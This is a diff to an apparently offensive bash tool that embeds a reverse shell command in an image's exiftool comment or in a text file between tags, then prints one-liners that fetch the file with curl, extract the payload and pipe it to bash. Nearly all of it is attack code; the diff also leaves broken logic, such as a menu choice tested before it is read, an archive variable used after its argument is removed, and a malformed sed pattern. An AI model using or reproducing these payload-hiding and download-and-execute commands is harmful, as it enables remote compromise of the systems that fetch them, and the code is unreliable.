@@ -24,7 +24,7 @@
 #-------------------------------------------------
 
 show_help() {
-    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename> [<zip>]"
+    echo "Usage: $0 [OPTIONS] <REVERSE_SHELL_COMMAND> <filename>"
     echo "Inject a reverse shell command into an image and generate a one-liner execution method."
     echo ""
     echo "Options:"
@@ -32,8 +32,7 @@ show_help() {
     echo ""
     echo "Arguments:"
     echo "  <REVERSE_SHELL_COMMAND> The reverse shell command to inject."
-    echo "  <filename>            The name of the image file."
-    echo "  <zip>                 (Optional) The name of the compressed archive containing the file."
+    echo "  <filename>            The name of the file."
     echo ""
 }
 
@@ -42,7 +41,7 @@ if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
     exit 0
 fi
 
-if [ $# -lt 2 ] || [ $# -gt 3 ]; then
+if [ $# -ne 2 ]; then
     echo "Error: Invalid number of arguments."
     show_help
     exit 1
@@ -52,11 +51,18 @@ command="$1"
 filename="$2"
 zip="$3"
 
+# For text files
+if [[ "$method_choice" == "11" ]]; then
+    echo -e "\e[34mInjecting reverse shell into text file..."
+    echo "<rs>$command</rs>" >> "$filename"
+    echo "Injection completed."
+fi
+
 exiftool -Comment="$command" "$filename"
 
 echo "Command injection completed."
 
-read -p "Enter the URL path to the image file (e.g., http://www.example.com/): " url
+read -p "Enter the URL path to the file (e.g., http://www.example.com/): " url
 
 echo "Execution methods compatible with image file format:"
 echo "1. image-exiftool-one-liner"
@@ -108,14 +114,9 @@ case "$method_choice" in
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
-    6|10|12)
-        if [ -z "$zip" ]; then
-            echo "Error: You must provide the name of the compressed archive containing the file."
-            exit 1
-        fi
-        read -p "Enter the name of the file inside the compressed archive: " file_inside_zip
+    6)
         echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
-        one_liner="curl -s '$url/$zip' | exiftool $zip / $file_inside_zip -Comment -b - | bash"
+        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
@@ -137,9 +138,21 @@ case "$method_choice" in
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
+    10)
+        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
+        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
     11)
         echo -e "\e[34mGenerating one-liner method with sed..."
         one_liner="curl -s '$url/$filename' | sed 's/<rs>//g' | sed 's/</rs>//' | bash"
+        echo "Generated one-liner:"
+        echo -e "$one_liner\e[0m"
+        ;;
+    12)
+        echo -e "\e[34mGenerating one-liner method with exiftool through zip..."
+        one_liner="curl -s '$url/$zip' | exiftool $zip / $filename -Comment -b - | bash"
         echo "Generated one-liner:"
         echo -e "$one_liner\e[0m"
         ;;
